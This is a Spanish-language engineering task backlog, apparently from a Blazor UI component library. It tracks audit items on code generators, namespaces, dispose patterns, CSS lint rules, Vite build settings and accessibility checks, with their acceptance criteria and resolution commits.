- **Estado**: ✅ Resuelto (commit `e9252aa`) — ambos generator projects (`CdCSharp.BlazorUI.Core.CodeGeneration` y `CdCSharp.BlazorUI.CodeGeneration`) ahora declaran `AnalyzerReleases.Shipped.md` + `AnalyzerReleases.Unshipped.md` como `<AdditionalFiles>` (criterios 1-2). El primero registra `BUIGEN010` en Unshipped tras GEN-06; el segundo queda con placeholder (ComponentInfoGenerator no emite diagnostics aún). Ambos con header `;`-comentario válido para evitar RS2007 en Shipped vacío. Criterio 3 (documentar flujo en CLAUDE.md) queda como follow-up — no bloquea; el workflow estándar de `AnalyzerReleaseTracking` es convención pública de Roslyn analyzers. Builds: 0 RS2007/RS2008 warnings en ambos proyectos.
- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core.CodeGeneration/`, `src/CdCSharp.BlazorUI.CodeGeneration/`.
- **Evidencia**: ambos csproj definen `<EnforceExtendedAnalyzerRules>true</EnforceExtendedAnalyzerRules>`. Cuando se añada el primer `DiagnosticDescriptor` (ver `GEN-06`, `GEN-03`, `GEN-05`), el compilador exigirá `AnalyzerReleases.Shipped.md` + `AnalyzerReleases.Unshipped.md` (regla RS2008).
- **Criterios de aceptación**:
  1. Crear ambos archivos por proyecto, inicialmente vacíos con header válido.
  2. Añadirlos al csproj con `<AdditionalFiles Include="AnalyzerReleases.Unshipped.md" />`.
  3. Documentar el flujo en `CLAUDE.md` → `CLAUDE-xx` (alimenta §3.23).

### `GEN-12` — `ColorClassGenerator.NormalizeWhitespace()` por clase; reemplazar por `StringBuilder` directo

- **Estado**: ✅ Resuelto (commit `4f88c1c`, criterios 1-2) — `ColorClassGenerator.Execute` pasa de construir un árbol sintáctico completo (AttributeList + ClassDeclaration + NamespaceDeclaration + CompilationUnit + `NormalizeWhitespace()`) a un emisor `StringBuilder`-based (nuevo método `BuildSource` + helper `AppendProperty`). Se eliminan `GenerateClassDeclaration`, `GenerateInnerClassDeclaration`, `GenerateProperty` (dead code). Capacidad inicial 64 KB para evitar reallocations en el caso típico (141 colores × 11 props = 1 551 propiedades). 9/9 snapshot tests siguen pasando → output **byte-idéntico** al previo, criterio 2 cumplido. Criterio 3 (benchmark) queda como follow-up — el `NormalizeWhitespace()` de Roslyn es el caso patológico conocido (documentado por el equipo de Roslyn); la migración se justifica por allocations reducidas incluso sin número.
- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core.CodeGeneration/ColorClassGenerator.cs:144`.
- **Evidencia**: construcción via Syntax API + `NormalizeWhitespace` por cada clase con `[AutogenerateCssColors]`. Aunque funciona, duplica costo de allocation (construir 1 500+ nodos sintácticos sólo para serializarlos). Un `StringBuilder` templado es ≈10× más rápido.
- **Criterios de aceptación**:
  1. Reescribir el emisor con `StringBuilder.Append` (mismo patrón que `Emitter` en `ComponentInfoGenerator`).
  2. Output byte-idéntico al anterior (snapshot tests cubren regresión).
  3. Benchmark antes/después en `docs` scenarios: target ≥50% reducción del tiempo de `Execute`.
- **Notas**: sólo hacer tras cerrar `GEN-01` (DTO serializable) para simplificar la reescritura.

### `GEN-13` — Documentar en `CLAUDE.md` el modelo "generator build-time only" (por qué el .nupkg no lleva `analyzers/dotnet/cs/`)

- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `CLAUDE.md` sección "Build pipeline" o nueva subsección "Code generation".
- **Evidencia**: ambos generators se referencian via `<ProjectReference ... OutputItemType="Analyzer" ReferenceOutputAssembly="false" />` en Core y BlazorUI. El output generado se baked en la DLL shipped. El paquete NuGet **no** incluye los generators bajo `analyzers/dotnet/cs/` — y es correcto así: consumidores no necesitan regenerar.
- **Criterios de aceptación**:
  1. Añadir sección "Code generation" en `CLAUDE.md` explicando:
     - `ColorClassGenerator`: run-once al compilar `Core`, produce `BUIColor.g.cs` baked en `Core.dll`.
     - `ComponentInfoGenerator`: run-once al compilar `BlazorUI`, produce `*ComponentInfo.g.cs` baked en `BlazorUI.dll`.
     - Por diseño, el `.nupkg` no expone los generators al consumidor.
     - Implicación: para que las docs consuman `*ComponentInfo`, necesitan `ProjectReference` a `BlazorUI` (no sólo `PackageReference`) durante desarrollo, o conformarse con los tipos compilados.
  2. Alimenta `CLAUDE-xx` en §3.23.

### `API-13` — `BUIPalette` vive en `Components.Layout` pero pertenece al dominio de theming

- **Estado**: ✅ Resuelto (commit `61066e8`) — `src/CdCSharp.BlazorUI/Components/Layout/BUIPalette.cs` movido a `src/CdCSharp.BlazorUI/Themes/BUIPalette.cs` (carpeta nueva en el proyecto BlazorUI; espejo en disco del namespace canónico). Namespace cambia de `CdCSharp.BlazorUI.Components.Layout` → `CdCSharp.BlazorUI.Themes` (criterio 1 — alineado con API-07 namespace policy: `Components`, `Abstractions`, `Themes`). `using CdCSharp.BlazorUI.Components;` añadido para resolver `CssColor`. Consumers actualizados: `BUIInitializer.razor` (`@using CdCSharp.BlazorUI.Themes`), `samples/AppTest.Wasm/_Imports.razor`, `samples/AppTest.Server/Components/Pages/Home.razor`, y `BUIBlazorLayoutStateTests.cs`. Build verde, 44 tests de BlazorLayout + Initializer pasan. Criterio 2 (alinear con API-07) satisfecho — API-07 ya cerrada, `BUIPalette` queda en el namespace correcto al ratificar el contrato.
- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/BUIPalette.cs:3`.
- **Evidencia**: el nombre sugiere paleta temática; su namespace lo mete entre componentes de layout (`BUIGrid`, `BUIStackedLayout`). Usuario buscando `using CdCSharp.BlazorUI.Themes;` no lo encuentra.
- **Criterios de aceptación**:
  1. Verificar uso real y decidir nuevo namespace (`CdCSharp.BlazorUI.Themes` / `CdCSharp.BlazorUI.Components`).
  2. Alineado con `API-07` (rediseño de namespaces).

### `API-14` — Considerar `[EditorBrowsable(Never)]` en tipos públicos requeridos por reflection/DI pero no user-facing

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**:
  - Builders fluentes de DI: `VariantBuilder`, `ComponentVariantBuilder<T>` (ya cubierto parcialmente en `API-12`).
  - Interfaces de callback JS (`IPatternJsCallback`, `IDropdownJsCallback`, `IDraggableJsCallback`, `IModalJsCallback`) si se decide dejarlas públicas.
  - Tipos de infraestructura de tree (`TreeStructure<,>`, `TreeNodeCache<>`, `TreeNodeBuildContext<>`) si no se documentan como extensión user-facing.
- **Evidencia**: IntelliSense del consumidor se satura con tipos que no usa. `[EditorBrowsable(EditorBrowsableState.Never)]` los oculta sin afectar la compilación.
- **Criterios de aceptación**:
  1. Revisar cada tipo público tras cerrar `API-04..API-08` y `API-11`; para los que queden públicos pero no user-facing, marcar el atributo.
  2. Documentar la regla en `CLAUDE.md` → `CLAUDE-xx`.
- **Notas**: ejecutar al final del ciclo, tras que el resto de tareas haya minimizado la superficie.

### `BLD-14` — `docs/CdCSharp.BlazorUI.Docs.Wasm` 19 warnings únicos

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: proyecto Docs WASM.
- **Criterios de aceptación**: 0 warnings tras limpieza; ver §3.22 `DOCS-WASM` para integración.

### `BLD-15` — `tools/CdCSharp.BlazorUI.Tools.MaterialIconsScrapper` 9 warnings únicos

- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: tool no shipped. Baja prioridad.

---

### `BASE-11` — `BUIInputComponentBase` mezcla `ValueTask DisposeAsync` público con `protected override void Dispose(bool)` heredado de `InputBase`: dos caminos sin coordinación

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIInputComponentBase.cs:75-107`.
- **Evidencia**: `InputBase<TValue>` implementa `IDisposable` y expone `protected virtual void Dispose(bool disposing)`. `BUIInputComponentBase` override lo para desuscribir `EditContext.OnValidationStateChanged` (`:99-107`) y a la vez añade un `public virtual ValueTask DisposeAsync()` (`:75-97`) para liberar `_behaviorInstance`. Si el runtime llama solo a `Dispose(bool)` (`IDisposable`), `_behaviorInstance` queda sin liberar; si llama solo a `DisposeAsync` (`IAsyncDisposable`), el event subscription se limpia — aunque Blazor siempre llama `DisposeAsync` cuando está implementado en el component, la coexistencia no documentada induce a error en derivadas.
- **Criterios de aceptación**:
  1. Unificar disposal en `DisposeAsync`: mover la desuscripción de `OnValidationStateChanged` allí y hacer que `Dispose(bool)` llame `DisposeAsync().AsTask().GetAwaiter().GetResult()` con la debida precaución, o simplemente delegue a `DisposeAsync`.
  2. Alternativa: documentar explícitamente que Blazor siempre usa `DisposeAsync` si el componente lo implementa y dejar `Dispose(bool)` solo para el path legacy.
  3. Test que fuerce la ruta síncrona (un fixture que implemente `IDisposable` manualmente) y verifique que `_behaviorInstance` se libera.
- **Notas**: se solapa parcialmente con `BASE-06` (gating `_disposed`). Resolver juntos.

---

### `BASE-12` — `BUIInputComponentBase.IsError` usa el `field` keyword de C# 13 con getter que combina backing field y param: sin XML‑doc ni test que cubra reentrancia

- **Estado**: ✅ Resuelto (commit `323ad00`) — reemplazado el patrón `field` keyword por un contrato uniforme en las interfaces `IHas*`: `IHasError`/`IHasReadOnly`/`IHasRequired` exponen ahora `X` + `IsX` (como `IHasDisabled`). `BUIComponentAttributesBuilder` lee siempre `IsX`. En `BUIInputComponentBase` el `IsError` es `Error || _lastValidationError`, siendo `_lastValidationError` un `bool` trackeado en `OnParametersSet` / `HandleValidationStateChanged` — lo que además arregla el bug de `hadErrors != IsError` (siempre falso porque `IsError` se recomputaba en sitio). Patrón documentado en `CLAUDE.md §"State parameters: [Parameter] X vs computed IsX"`. Cobertura del contrato nuevo se extiende en `COMP-AUDIT-STATE-01`.
- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIInputComponentBase.cs:35,40,168-178`.
- **Evidencia**: `public bool IsError { get => field || Error; private set; }` combina el backing field (asignado desde `UpdateErrorState`) con la property `Error` (parámetro consumer). La lógica es sutil: el setter privado se asigna desde `UpdateErrorState` (validación de `EditContext`), y el getter siempre hace OR con `Error` público; un consumidor que haga `Error = false` mientras haya mensaje de validación sigue leyendo `IsError=true`. Además, `HandleValidationStateChanged` guarda `bool hadErrors = IsError` **antes** de `UpdateErrorState()` y compara después; si el `field` keyword se evalúa con re-entrancia (porque `IHasError.Error => IsError`, `:40`, apunta al mismo getter) podría haber lectura inconsistente si el `_styleBuilder.BuildStyles` accede al IHasError durante el cambio. El comportamiento actual parece correcto pero la construcción merece XML-doc.
- **Criterios de aceptación**:
  1. Añadir XML-doc a `IsError` explicando que `IsError = Error (param) OR backingField (from EditContext)` y que `IHasError.Error => IsError` para que el builder lea el estado compuesto.
  2. Test que force: `Error=true, sin EditContext` → `IsError=true`; `Error=false, con validation message` → `IsError=true`; `Error=false, sin EditContext, sin messages` → `IsError=false`.
  3. Test de reentrancia: `BuildStyles` durante `HandleValidationStateChanged` no debe producir lecturas inconsistentes.
- **Notas**: mencionar el uso del `field` keyword de C# 13 en `CLAUDE.md` como patrón aceptado; es la única ocurrencia en la solución.

---

### `COMP-AUDIT-STATE-01` — Auditar patrón `[Parameter] X` + computed `IsX` en los 5 estados (`Disabled`, `Error`, `ReadOnly`, `Required`, `Active`)

- **Estado**: ✅ Resuelto (commit `d93234b`) — criterios 1-3 aplicados: las 5 interfaces exponen `X` + `IsX` (compila-enforced tras BASE-12); grep en `src/**/*.razor` muestra que todas las atribuciones de HTML nativo (`disabled`, `readonly`, `required`) y `aria-*` en componentes `BUIInputComponentBase`-derived leen `IsX`. Cambios aplicados en `BUIInputText`, `BUIInputTextArea`, `BUIInputNumber`, `BUIInputColor`, `BUIInputDateTime`, `BUIDropdownContainer`, `BUIInputCheckbox`, `BUIInputRadio`. Los forwards parent→child (`BUIInputDropdown`→`BUIDropdownContainer`, `BUIInputDropdownTree`→`BUIDropdownContainer`) mantienen `X` crudo porque el container re-evalúa su propio `IsX` — comportamiento correcto. Los helpers internos (`_BUICheckMark`, `_BUIInText`, `_BUIInSelect`, `_BUIInNumber`) no implementan `IHas*` y su `X`/`IsX` no aplica. `BUISelect` tiene parámetros `Required`/`ReadOnly` locales sin implementar `IHasRequired`/`IHasReadOnly` — fuera del contrato `IHas*` por diseño. 2502/2502 tests pasan. Criterio 4 (test/lint automatizado) queda delegado a `COMP-LINT-01`.
- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: todos los componentes y bases que implementen `IHasDisabled` / `IHasError` / `IHasReadOnly` / `IHasRequired` / `IHasActive`, más todos los `.razor` que consuman esos estados para atributos HTML nativos (`disabled`, `readonly`, `aria-*`) o para gating interno.
- **Evidencia**: `CLAUDE.md §"State parameters"` define el contrato: `X` (parámetro) sólo fuerza el estado desde fuera, `IsX` (computed) es la verdad consumida por el builder, `aria-*` y cualquier gate interno. Hoy `BUIInputComponentBase` y los stubs de test cumplen el contrato; el resto del código base no ha sido auditado línea a línea. El builder ya lee `IsX` uniformemente (`BUIComponentAttributesBuilder.BuildStyles` y `PatchVolatileAttributes`), pero los componentes que renderizan manualmente `disabled="@Disabled"` / `readonly="@ReadOnly"` / `aria-invalid="@Error"` / `aria-required="@Required"` incumplen si el componente añade condiciones internas a su `IsX` (p.ej. loading en `IsDisabled`).
- **Criterios de aceptación**:
  1. Cada implementador directo de las 5 interfaces expone tanto `X` como `IsX` (compila = auto-enforced tras este commit).
  2. Grep rechaza cualquier uso de `@Disabled`, `@Error`, `@ReadOnly`, `@Required`, `@Active` en `.razor` cuando se destine a HTML/aria — debe ser `@IsX`.
  3. `aria-disabled`/`aria-invalid`/`aria-readonly`/`aria-required`/`aria-pressed` apuntan a `IsX`.
  4. Test/lint (extensión de `COMP-LINT-01`) que auto-descubre tipos públicos derivados de `BUIComponentBase`/`BUIInputComponentBase` y verifica por reflection que para cada `IHas*` de estado implementado, `IsX = X` cuando no hay condición interna, e `IsX = true` cuando `X = true` (contrato OR).
- **Notas**: resuelto en conjunto con `BASE-12`. `COMP-LINT-01` es el vehículo natural para el gate automatizado.

---

### `COMP-LINT-01` — Introducir test/analyzer que verifique el contrato mínimo de componente: `<bui-component @attributes="ComputedAttributes">` como único root DOM

- **Severidad**: Polish
- **Esfuerzo**: M
- **Alcance**: nuevo test/analyzer bajo `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Library/` o `src/CdCSharp.BlazorUI.CodeGeneration/`.
- **Evidencia**: hoy la violación de `COMP-TOASTHOST-01` (spread omitido) sólo se detecta con el grep manual que hemos hecho en este análisis. Un consumidor interno podría introducir otra violación idéntica sin que CI lo pille. Una protección automatizada puede implementarse como:
  - (a) **bUnit test** parametrizado con `TestScenarios.All` que, para cada tipo que derive de `BUIComponentBase` en el assembly, lo renderice y verifique `cut.FindAll("bui-component").Should().HaveCount(1)` y `cut.Find("bui-component").GetAttribute("data-bui-component").Should().NotBeNullOrEmpty()`.
  - (b) **Roslyn analyzer** en `CdCSharp.BlazorUI.Core.CodeGeneration` que parsee los `.razor` con `[GenerateComponentInfo]` y verifique el patrón del root. Menos preferible por complejidad del parsing razor (ver `GEN-03`).
- **Criterios de aceptación**:
  1. Elegir (a) — es el camino más simple y ya hay infraestructura bUnit.
  2. Test auto-descubre todos los tipos `public` que deriven de `BUIComponentBase` / `BUIInputComponentBase<,,>` / `BUIVariantComponentBase<,>` en el assembly; los renderiza con parámetros por defecto (o skip si requieren `[EditorRequired]` complejo) y verifica el invariante.
  3. Añadir al CI gate: fallo → PR bloqueado.
- **Notas**: complementa `CLAUDE-xx` sobre la regla.

---

### `CSS-SCOPED-08` — Lint test/analyzer que verifique las 10 reglas de CSS scoped (`CLAUDE.md §CSS-architecture`)

- **Severidad**: Polish
- **Esfuerzo**: M
- **Alcance**: nuevo test bajo `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Library/ScopedCssLintTests.cs` **o** analyzer en `CdCSharp.BlazorUI.CodeGeneration`.
- **Evidencia**: las reglas 1-10 del estándar CSS (CLAUDE.md) son inspeccionables estáticamente sobre los `.razor.css`: ausencia de root `bui-component[data-bui-component="..."]`, uso de private `--_*` var pattern, ausencia de `#hex`/`rgba()` literales, ausencia de state-as-class (rule 7), uso de `calc(... * var(--bui-size-multiplier))` para dimensiones, ausencia de `@media` en componentes no-layout, etc. Todas las tareas `CSS-SCOPED-01..07` son detectables por lint.
- **Criterios de aceptación**:
  1. Implementar una suite de tests que lea los `.razor.css` del paquete (via embedded resource o disk walk en build dir) y valide cada regla.
  2. Cada fallo apunta a `archivo:línea` + nombre de la regla violada.
  3. CI gate: un PR que añada un `.razor.css` violando cualquier regla falla el build.
  4. Baseline: al abrir el lint, `CSS-SCOPED-01..07` fallan; la propia resolución de esas tareas limpia la baseline.
- **Notas**: extensión natural de `COMP-LINT-01`. Considerar compartir infra.

---

### `CSS-SCOPED-09` — Meta-task: pase DOM↔CSS per-component cross-check (28 componentes × 10 reglas)

- **Severidad**: Polish
- **Esfuerzo**: XL
- **Alcance**: todos los componentes en `src/CdCSharp.BlazorUI/Components/**/*.razor.css`.
- **Evidencia**: el análisis F1 ha hecho un pase **horizontal** (grep de patrones) sobre los 52 `.razor.css`. Queda pendiente el pase **vertical** por componente: confirmar que el DOM emitido por el `.razor` (atributos del root, classes BEM, estructura children) se casa con los selectores del `.razor.css` correspondiente. Es simétrico a `COMP-AUDIT-CHECKLIST-01` desde el lado CSS.
- **Criterios de aceptación**:
  1. Por cada componente: abrir su `.razor` + su `.razor.css` lado a lado, verificar que cada selector del CSS referencia un nodo o clase realmente emitido por el template, y viceversa (CSS muerto = bug silente).
  2. Registrar violaciones como sub-tareas `CSS-SCOPED-<Component>-<NN>`.
  3. Cerrar esta meta-task con un checklist marcado en el body.
  4. Ejecutable en paralelo con `COMP-AUDIT-CHECKLIST-01` durante F2 (mismo scope, vista opuesta).
- **Notas**: meta-task como `COMP-AUDIT-CHECKLIST-01`. Mantener abierta hasta cerrar las 28 verificaciones.

---

### `CSS-BUNDLE-05` — Meta: §3.9 queda cubierto parcialmente por `BLD-PIPE-01..16`; consolidar cross‑references en un único índice

- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: documentación interna (`TASKS.md`, `ANALYSIS.md`).
- **Evidencia**: §3.9 del plan pide "revisar cada `CssBundle/*.css` a través de su generator". El análisis del pipeline (§3.3) ya enumeró issues per-generator: `BLD-PIPE-01` (reset focus), `BLD-PIPE-03` (DataCollectionFamily hardcodes), `BLD-PIPE-06` (DesignTokens fuera de FeatureDefinitions), `BLD-PIPE-07` (Typography magic values), `BLD-PIPE-08` (ScrollBar global), `BLD-PIPE-09` (InitializeThemes paleta incompleta), `BLD-PIPE-10` (Transitions sin tokens), `BLD-PIPE-11`, `BLD-PIPE-12` (InputFamily literals), `BLD-PIPE-04` (PickerFamily hardcodes), `BLD-PIPE-05` (family namespace), `BLD-PIPE-13..16`. Más `CSS-BUNDLE-01..04` (nivel bundle). Riesgo: durante F2 se puede creer que §3.9 cubre algo más que ya está desglosado en BLD-PIPE.
- **Criterios de aceptación**:
  1. En `ANALYSIS.md §4.1` fila 3.9, añadir nota "cubierto por BLD-PIPE-01..16 + CSS-BUNDLE-01..04; no requiere tareas adicionales".
  2. En TASKS.md crear sección "Mapeo §3.9 → tasks" como comentario o tabla auxiliar.
  3. Cerrar esta meta-task cuando el mapeo sea visible en la documentación.
- **Notas**: housekeeping de trazabilidad F1 → F2.

---

### `CSS-OPT-06` — Validar que la minificación de Vite (`blazorui.css`) no purga reglas necesarias para variantes/hooks dinámicos

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Infrastructure/BuildTemplates.cs` (`vite.config.css.js` template), output `wwwroot/css/blazorui.css`.
- **Evidencia**: `§3.10` paso 10 del plan. Vite hace minificación CSS por defecto (cssnano). Si en algún momento se añade tree-shaking (via PurgeCSS o postcss-purge), las clases aplicadas dinámicamente por variants o por composición del consumidor (`class="bui-button__override"` desde un `RenderFragment` externo) podrían marcarse como "unused" y borrarse.
- **Criterios de aceptación**:
  1. Auditar `vite.config.css.js` generado: confirmar que **no** hay plugin de purga (actualmente no lo hay — solo minify por defecto).
  2. Documentar en `CLAUDE.md` que la minificación debe preservar todas las reglas (no activar purga hasta que `CSS-OPT-02` + `CSS-OPT-05` cierren y haya listado oficial de hooks públicos).
  3. Si se quiere reducir tamaño, considerar `cssnano` con preset `default` (seguro) vs `advanced` (peligroso con custom properties).
- **Notas**: complementa `CSS-OPT-05` (hooks públicos).

---

### `THEME-09` — `CssColor.SetContrastBlack/White` static setters sin getters correspondientes: fields dead

- **Estado**: ✅ Resuelto (commit `f97a474`, criterio 1 aplicado) — eliminados los dos `static CssColor? _contrastBlack`/`_contrastWhite` y sus setters `SetContrastBlack`/`SetContrastWhite`. Grep confirmó que ningún consumidor invoca los setters; `GetBestContrast(black, white)` ya recibe los colores por parámetro. Criterio 2 (convertirlos en uso real) descartado — preferencia documentada en notas: static mutable state es antipatrón en librería reusable. Superficie pública se limpia de 2 métodos. 2542/2542 tests pasan.
- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Css/CssColor.cs:423-434`.
- **Evidencia**:
  ```csharp
  private static CssColor? _contrastBlack;
  private static CssColor? _contrastWhite;
  public static void SetContrastBlack(CssColor black) => _contrastBlack = black;
  public static void SetContrastWhite(CssColor white) => _contrastWhite = white;
  ```
  Los fields `_contrastBlack`/`_contrastWhite` nunca se leen en el resto del archivo. `GetBestContrast(black, white)` toma los colores por parámetro. Los setters son dead code; ningún consumidor los llama.
- **Criterios de aceptación**:
  1. Eliminar los dos fields estáticos y sus setters.
  2. O, alternativamente, hacer que `GetBestContrast()` sin parámetros lea de los fields como defaults (convertirlos en uso real).
- **Notas**: static mutable state, mala práctica en librería reutilizable. Preferencia: eliminar.

---

### `THEME-10` — `implicit operator string(CssColor)` / `implicit operator CssColor(string)`: conversiones implícitas facilitan bugs sutiles

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Css/CssColor.cs:496-504`.
- **Evidencia**:
  ```csharp
  public static implicit operator string(CssColor? color) => color?.ToString() ?? string.Empty;
  public static implicit operator CssColor(string input) => new(input);
  ```
  Implicit string → CssColor puede lanzar `ArgumentException` dentro del constructor desde contextos inesperados (`CssColor c = someNullableString;` → si es null, NullReferenceException; si es "invalid", throws). Framework guidelines (Microsoft CA2225) recomiendan métodos explícitos `FromString` + operator cast `explicit`.
- **Criterios de aceptación**:
  1. Convertir los dos operators en `explicit` (breaking change menor).
  2. Añadir `public static CssColor Parse(string value)` + `public static bool TryParse(string value, out CssColor)` como API canónica.
  3. Refactor de los call sites que hoy dependen de implicit.
- **Notas**: breaking change — documentar en release notes.

### `JS-11` — TypeScript sin toggle Debug/Release para source-maps y sin política documentada

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Infrastructure/BuildTemplates.cs` (templates `vite.config.js`, `tsconfig.json`); `src/CdCSharp.BlazorUI/_build/CdCSharp.BlazorUI.targets`.
- **Evidencia**: la configuración de Vite/tsc actual no diferencia entre `Debug` y `Release`. En Debug convendría `sourcemap: true` + `minify: false` para poder inspeccionar el JS bundleado desde el DevTools del navegador al depurar un componente consumidor; en Release, `sourcemap: false` + `minify: 'esbuild'` para reducir tamaño NuGet. Hoy el comportamiento viene determinado por los defaults de Vite, no por `$(Configuration)`, y no hay documentación que describa qué se espera en cada caso.
- **Criterios de aceptación**:
  1. Parametrizar el `[BuildTemplate]` de `vite.config.js` para emitir `sourcemap` y `minify` condicionados a `process.env.BUILD_CONFIG` (o equivalente).
  2. En `_build/CdCSharp.BlazorUI.targets`, pasar `$(Configuration)` a `CdCSharp.BlazorUI.BuildTools` como argumento/variable de entorno antes de invocar `npm run build`.
  3. Documentar la política en `CLAUDE.md` → `CLAUDE-xx` (alimenta §3.23): "Debug ⇒ source maps + no minify; Release ⇒ sin source maps + minify".
  4. Verificar que los paquetes NuGet publicados en `Release` no contienen `.map` (inspección del `.nupkg`).
- **Notas**: afecta sólo a tooling/DX, sin cambios de API pública.

### `JS-12` — `Types/Debug/DebugPanel.ts` queda fuera del pipeline de Vite (incluido como `Content PreserveNewest`)

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj:13-16` (`<Content Include="Types\Debug\DebugPanel.ts">`); `src/CdCSharp.BlazorUI/Types/Debug/DebugPanel.ts`; `src/CdCSharp.BlazorUI.BuildTools/Generators/` (ningún generador lo procesa); `Infrastructure/BuildTemplates.cs` (template `CssBundle/entry.js` lo ignora).
- **Evidencia**:
  ```xml
  <Content Include="Types\Debug\DebugPanel.ts">
      <ExcludeFromSingleFile>true</ExcludeFromSingleFile>
      <CopyToPublishDirectory>PreserveNewest</CopyToPublishDirectory>
  </Content>
  ```
  Este archivo se copia tal cual al output (`.ts`, no `.js`), sin pasar por Vite ni tsc. Esto significa que (a) cualquier `import` que haga no se resuelve, (b) un consumidor del paquete NuGet no puede cargarlo como módulo sin setup adicional, y (c) no se beneficia de `strict` ni de los chequeos del tsconfig del build pipeline. Además, rompe la uniformidad documentada en CLAUDE.md ("TypeScript … bundled to `wwwroot/js/` by Vite").
- **Criterios de aceptación**:
  1. Decidir: (A) integrar `DebugPanel.ts` en el bundle de Vite como entry secundaria (`debugpanel.js` dentro de `wwwroot/js/`), o (B) documentar explícitamente que es un artefacto de *diagnóstico interno* que no se distribuye (eliminar `CopyToPublishDirectory`).
  2. Si (A): añadir entry a `vite.config.js` template; actualizar el componente Debug correspondiente para cargar la versión bundleada.
  3. Si (B): quitar el `<Content Include>` del csproj y dejarlo como archivo de desarrollo solamente; alternativa: mover a `tools/` o a un proyecto separado.
  4. Documentar la decisión en `CLAUDE.md` → `CLAUDE-xx` (alimenta §3.23).
- **Notas**: el nombre "DebugPanel" sugiere herramienta de diagnóstico en dev; probablemente la opción (B) sea correcta, pero requiere confirmar con el owner.

### `ASYNC-10` — `DelayedActionHandler.ExecuteWithDelayAsync` no revalida `_disposed` tras el `await Task.Delay`

- **Estado**: ✅ Resuelto (commit `fb34098`) — nuevo overload `ExecuteWithDelayAsync(Func<CancellationToken, Task>, TimeSpan)` que reenvía el token a `action`. El overload original `Func<Task>` delega en el nuevo. `Dispose()` sigue cancelando el CTS → actions largas ahora pueden propagar cancelación (el token cambia a canceled). Catch ampliado a `OperationCanceledException`. Criterio 1 aplicado; criterio 2 innecesario (ya cubierto por el código).
- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Utilities/DelayedActionHandler.cs:30-58`.
- **Evidencia**:
  ```csharp
  try
  {
      await Task.Delay(delay, cts.Token);
      if (cts.Token.IsCancellationRequested) return;

      lock (_lock)
      {
          if (_disposed) return;
      }

      await action();   // <-- si _disposed pasa a true DURANTE action(), no se detecta
  }
  catch (TaskCanceledException) { }
  ```
  La validación `_disposed` se hace antes de `await action()`. Si `action()` es una cadena larga (p. ej. `await SomeJsInterop(); await StateHasChanged();`) y el caller dispone el handler durante la ejecución de `action()`, el `await` interno sigue referenciando un CTS ya disposed (paradójicamente no se cancela porque el Dispose **no** cancela el token, sólo libera recursos). Es más conceptual que práctico — `DelayedActionHandler` es usado por `BUITreeMenu` con `action()` cortas.
- **Criterios de aceptación**:
  1. Opcional: pasar `cts.Token` como parámetro al `Func<Task>` para que `action` pueda propagar cancelación.
  2. Alternativamente: añadir comentario documentando la suposición (action corta y stateless).
- **Notas**: baja prioridad; sólo impacta patrones que aún no usa la librería.

### `ASYNC-11` — Documentar en CLAUDE.md el patrón canónico fire-and-forget + helpers estándar

- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `CLAUDE.md` (sección *Async / JS interop conventions*).
- **Evidencia**: CLAUDE.md enumera reglas sobre `ConfigureAwait(false)`, `try/catch (JSDisconnectedException) { } catch (InvalidOperationException) { }` y disposed-guard. Falta la guía específica para fire-and-forget: cuándo es aceptable, qué excepciones deben capturarse, cómo loguear las no-canceladas, y nombre del helper canónico (ver `ASYNC-03`).
- **Criterios de aceptación**:
  1. Añadir subsección "Fire-and-forget patterns" en `CLAUDE.md` → `CLAUDE-xx` (alimenta §3.23) con: (a) no permitido desde código llamado por `EventCallback` (preferir await); (b) aceptable desde handlers de `event Action?` custom; (c) usar `BUIAsyncHelper.SafeFireAndForget` siempre.
  2. Incluir ejemplo mínimo: handler de evento síncrono que dispara trabajo async.
- **Notas**: depende de que `ASYNC-03` se resuelva y exista el helper; doc puede ir en el mismo PR.

### `A11Y-10` — Auditoría automática (axe-core / IBM Equal Access) sobre `docs/CdCSharp.BlazorUI.Docs.Wasm`: baseline + gate CI

- **Severidad**: Polish
- **Esfuerzo**: M
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/` (renderiza todos los componentes de la librería); `.github/workflows/publish.yml` (añadir job de auditoría a11y opcional).
- **Evidencia**: no existe auditoría automatizada. Los tests bUnit cubren `data-bui-*` y `aria-*` presentes, pero no ejecutan reglas WCAG holísticas (contraste en runtime, foco real en navegador, orden de lectura, consistencia de `h1/h2/h3`).
- **Criterios de aceptación**:
  1. Añadir script npm/playwright que levanta la docs WASM, navega a cada página de componente y ejecuta `axe-core`.
  2. Capturar baseline: nº de violations + sus reglas (documentar en `done_TASKS.md` o similar) como referencia pre-F2.
  3. Gate CI que falla si se introducen nuevas violations de severidad `serious`+.
- **Notas**: deliverable; muchas tareas A11Y-01..09 se validarán con esta herramienta en vez de tests unitarios.

### `A11Y-11` — Documentar checklist WCAG 2.2 AA por componente en `CLAUDE.md`/docs

- **Severidad**: Polish
- **Esfuerzo**: S
